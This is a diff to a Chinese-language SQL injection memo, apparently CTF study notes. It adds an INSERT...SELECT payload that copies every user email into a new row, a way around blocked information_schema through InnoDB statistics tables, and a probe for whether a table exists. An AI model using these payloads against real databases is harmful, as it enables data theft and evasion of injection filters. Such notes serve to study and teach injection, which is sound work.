@@ -96,6 +96,19 @@ if($rs->fetch_row()){
 
 ## 一些小知识
 
+
+
+### 向一张表中插入该表的数据的方法
+
+```
+insert ... select...
+insert into users (email,username,password) values((SELECT group_concat(a) FROM (select 'email:'`a` union SELECT group_concat(email) from users)`b`),1,1)
+```
+
+
+
+
+
 ### pdo
 
 PDO可以堆叠注入
@@ -217,6 +230,15 @@ SELECT
 
 
 ## 绕过
+
+### 禁用 information
+
+```
+Mysql5.6及以上版本中 `innodb_index_stats ` 和`innodb_table_stats `这两个表中都包含所有新创建的数据库和表名
+sys.schema_table_statistics ...
+```
+
+
 
 
 
@@ -444,6 +466,16 @@ select * from flags where id='abcdd' union select 1,(select group_concat(b,e,f,g
 
 
 ## 注入语句备忘
+
+
+
+### 表是否存在
+
+```
+select count(*) from xxx;
+```
+
+
 
 
 
@@ -897,6 +929,12 @@ set global log_output='table'; -- 设置输出类型为 table
 set global log_output='file';   -- 设置输出类型为file
 
 ```
+
+
+
+## ORACLE SQL
+
+
 
 
 
